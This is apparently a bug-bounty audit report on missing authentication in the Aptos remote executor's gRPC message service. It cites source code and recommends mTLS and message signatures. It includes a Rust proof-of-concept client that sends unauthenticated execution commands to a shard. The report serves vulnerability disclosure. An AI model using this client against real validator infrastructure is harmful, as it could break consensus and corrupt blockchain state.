# Audit Report

## Title
Critical Authentication Bypass in Remote Executor Service Network Message Handler

## Summary
The `NetworkMessageService` gRPC trait and its implementation in `GRPCNetworkMessageServiceServerWrapper` lack any authentication mechanism, allowing any network client to send arbitrary execution commands to executor shards, potentially causing consensus failures and state corruption.

## Finding Description

The remote executor service uses a gRPC-based network message system to coordinate distributed transaction execution across multiple shards. The `NetworkMessageService` trait defines the interface for this communication, with `simple_msg_exchange` as the primary method for message handling. [1](#0-0) 

The trait signature requires no authentication parameters and the implementation performs no caller verification: [2](#0-1) 

The server is initialized without TLS or any authentication layer: [3](#0-2) 

This service is used in production by the `ExecutorService` to receive and process execution commands: [4](#0-3) 

The coordinator client receives these unauthenticated messages and directly executes them: [5](#0-4) 

**Attack Path:**
1. Attacker crafts a `NetworkMessage` with `message_type="execute_command_{shard_id}"`
2. Serializes a malicious `ExecuteBlockCommand` containing arbitrary transactions
3. Sends gRPC request to `http://{shard_address}/aptos.remote_executor.v1.NetworkMessageService/SimpleMsgExchange`
4. The message is routed to the shard's command handler without authentication
5. The shard deserializes and executes the transactions

This breaks the **Deterministic Execution** invariant - if an attacker sends different commands to different shards, they will produce divergent state roots, causing consensus failure. It also violates **Access Control** invariants by allowing unauthorized execution requests.

## Impact Explanation

**Critical Severity** - This vulnerability enables:

1. **Consensus/Safety Violations**: By sending different execution commands to different shards, an attacker can cause validators to compute different state roots for the same block height, breaking consensus safety guarantees and potentially requiring a hard fork to recover.

2. **State Corruption**: Arbitrary transaction execution can corrupt the blockchain state, affecting all downstream operations including staking, governance, and user transactions.

3. **Unauthorized Transaction Execution**: An attacker can execute transactions without proper validation, signing, or gas payment, bypassing the entire transaction validation pipeline.

4. **DoS via Resource Exhaustion**: Flooding shards with malicious execution commands can exhaust computational resources and cause validator nodes to fall behind.

This meets the "Consensus/Safety violations" criterion for Critical Severity in the Aptos bug bounty program, potentially qualifying for up to $1,000,000.

## Likelihood Explanation

**Likelihood: Medium to High** depending on deployment configuration.

**Factors increasing likelihood:**
- The service is production-ready code with a standalone entry point and command-line interface
- No documentation warns that network isolation is required
- The service binds to SocketAddr provided as configuration, which could be 0.0.0.0
- Common misconfigurations (exposed ports, incorrect firewall rules) would immediately enable exploitation

**Factors decreasing likelihood:**
- The service appears designed for distributed execution across machines, suggesting private network deployment
- Production deployments likely use network segmentation

However, **defense-in-depth principles dictate that application-layer authentication should not be omitted**, even if network-level security is expected. A single misconfiguration exposes critical execution infrastructure with no additional protection.

## Recommendation

Implement multi-layered authentication for the remote executor service:

1. **Add mTLS (Mutual TLS)**:
   - Configure the gRPC server with TLS certificates
   - Require client certificate verification
   - Example from other Aptos services: [6](#0-5) 

2. **Implement Message-Level Authentication**:
   - Add cryptographic signatures to `NetworkMessage` 
   - Verify signatures in `simple_msg_exchange` before routing
   - Use the coordinator's public key for verification
   - Reject messages with invalid or missing signatures

3. **Add Authorization Checks**:
   - Maintain an allowlist of authorized coordinator addresses
   - Verify the remote peer address matches expected coordinator

**Example implementation pattern**:
```rust
async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    // Verify mTLS client certificate
    let peer_certs = request.peer_certs()
        .ok_or(Status::unauthenticated("No client certificate"))?;
    
    // Verify message signature
    let network_message = request.into_inner();
    if !self.verify_message_signature(&network_message) {
        return Err(Status::unauthenticated("Invalid signature"));
    }
    
    // Existing message routing logic...
}
```

## Proof of Concept

```rust
// PoC: Malicious gRPC client that can execute arbitrary commands on executor shards
// Compile and run with: cargo run --bin attack_remote_executor

use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use aptos_types::block_executor::{
    config::BlockExecutorConfigFromOnchain,
    partitioner::SubBlocksForShard,
};
use aptos_executor_service::{ExecuteBlockCommand, RemoteExecutionRequest};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Target executor shard (obtained via reconnaissance)
    let target_shard_addr = "http://10.0.0.100:52201"; // Example shard address
    let shard_id = 0;
    
    // Connect to the unauthenticated gRPC service
    let mut client = NetworkMessageServiceClient::connect(target_shard_addr).await?;
    
    // Craft a malicious execution command
    let malicious_command = ExecuteBlockCommand {
        sub_blocks: SubBlocksForShard::empty(), // Simplified - would contain malicious txns
        concurrency_level: 8,
        onchain_config: BlockExecutorConfigFromOnchain::default(),
    };
    
    // Wrap in request envelope
    let request = RemoteExecutionRequest::ExecuteBlock(malicious_command);
    let serialized = bcs::to_bytes(&request)?;
    
    // Create network message targeting the shard's command channel
    let network_message = NetworkMessage {
        message: serialized,
        message_type: format!("execute_command_{}", shard_id),
    };
    
    // Send the unauthenticated request - no signature, no credentials required
    let response = client.simple_msg_exchange(Request::new(network_message)).await?;
    
    println!("Successfully sent malicious command to shard {}", shard_id);
    println!("Response: {:?}", response);
    
    // The shard will execute this command without any authentication checks
    // If different commands are sent to different shards, consensus will fail
    
    Ok(())
}
```

**To demonstrate the vulnerability:**
1. Deploy executor shards using the provided `main.rs` entry point
2. Run the PoC client against any shard address
3. Observe that the message is accepted and processed without authentication
4. Monitor shard execution to see the malicious command being executed

## Notes

This vulnerability represents a **fundamental security architecture flaw** - the complete absence of authentication in a critical distributed system component. While the service may be intended for deployment on private networks, the lack of application-layer security violates defense-in-depth principles and creates a single point of failure in the security model.

The issue is particularly severe because:
- The gRPC endpoint is the primary interface for coordinator-to-shard communication
- Compromise enables arbitrary transaction execution across all shards
- Different commands to different shards can break consensus determinism
- No audit trail exists for unauthenticated requests

Even if network segmentation is assumed, production systems should implement cryptographic authentication at the application layer to protect against misconfiguration, insider threats, and network compromise.

### Citations

**File:** protos/rust/src/pb/aptos.remote_executor.v1.tonic.rs (L127-133)
```rust
    pub trait NetworkMessageService: Send + Sync + 'static {
        ///
        async fn simple_msg_exchange(
            &self,
            request: tonic::Request<super::NetworkMessage>,
        ) -> std::result::Result<tonic::Response<super::Empty>, tonic::Status>;
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L57-88)
```rust
    async fn start_async(
        self,
        server_addr: SocketAddr,
        rpc_timeout_ms: u64,
        server_shutdown_rx: oneshot::Receiver<()>,
    ) {
        let reflection_service = tonic_reflection::server::Builder::configure()
            .register_encoded_file_descriptor_set(FILE_DESCRIPTOR_SET)
            .build_v1()
            .unwrap();

        info!("Starting Server async at {:?}", server_addr);
        // NOTE: (1) serve_with_shutdown() starts the server, if successful the task does not return
        //           till the server is shutdown. Hence this should be called as a separate
        //           non-blocking task. Signal handler 'server_shutdown_rx' is needed to shutdown
        //           the server
        //       (2) There is no easy way to know if/when the server has started successfully. Hence
        //           we may need to implement a healthcheck service to check if the server is up
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
        info!("Server shutdown at {:?}", server_addr);
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L92-115)
```rust
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** execution/executor-service/src/remote_executor_service.rs (L15-72)
```rust
pub struct ExecutorService {
    shard_id: ShardId,
    controller: NetworkController,
    executor_service: Arc<ShardedExecutorService<RemoteStateViewClient>>,
}

impl ExecutorService {
    pub fn new(
        shard_id: ShardId,
        num_shards: usize,
        num_threads: usize,
        self_address: SocketAddr,
        coordinator_address: SocketAddr,
        remote_shard_addresses: Vec<SocketAddr>,
    ) -> Self {
        let service_name = format!("executor_service-{}", shard_id);
        let mut controller = NetworkController::new(service_name, self_address, 5000);
        let coordinator_client = Arc::new(RemoteCoordinatorClient::new(
            shard_id,
            &mut controller,
            coordinator_address,
        ));
        let cross_shard_client = Arc::new(RemoteCrossShardClient::new(
            &mut controller,
            remote_shard_addresses,
        ));

        let executor_service = Arc::new(ShardedExecutorService::new(
            shard_id,
            num_shards,
            num_threads,
            coordinator_client,
            cross_shard_client,
        ));

        Self {
            shard_id,
            controller,
            executor_service,
        }
    }

    pub fn start(&mut self) {
        self.controller.start();
        let thread_name = format!("ExecutorService-{}", self.shard_id);
        let builder = thread::Builder::new().name(thread_name);
        let executor_service_clone = self.executor_service.clone();
        builder
            .spawn(move || {
                executor_service_clone.start();
            })
            .expect("Failed to spawn thread");
    }

    pub fn shutdown(&mut self) {
        self.controller.shutdown();
    }
}
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L79-113)
```rust
impl CoordinatorClient<RemoteStateViewClient> for RemoteCoordinatorClient {
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);

                match request {
                    RemoteExecutionRequest::ExecuteBlock(command) => {
                        let init_prefetch_timer = REMOTE_EXECUTOR_TIMER
                            .with_label_values(&[&self.shard_id.to_string(), "init_prefetch"])
                            .start_timer();
                        let state_keys = Self::extract_state_keys(&command);
                        self.state_view_client.init_for_block(state_keys);
                        drop(init_prefetch_timer);

                        let (sub_blocks, concurrency, onchain_config) = command.into();
                        ExecutorShardCommand::ExecuteSubBlocks(
                            self.state_view_client.clone(),
                            sub_blocks,
                            concurrency,
                            onchain_config,
                        )
                    },
                }
            },
            Err(_) => ExecutorShardCommand::Stop,
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L217-228)
```rust
            let cert = tokio::fs::read(config.cert_path.clone()).await?;
            let key = tokio::fs::read(config.key_path.clone()).await?;
            let identity = tonic::transport::Identity::from_pem(cert, key);
            tracing::info!(
                grpc_address = listen_address.to_string().as_str(),
                "[Data Service] Starting gRPC server with TLS."
            );
            tasks.push(tokio::spawn(async move {
                Server::builder()
                    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
                    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
                    .tls_config(tonic::transport::ServerTlsConfig::new().identity(identity))?
```
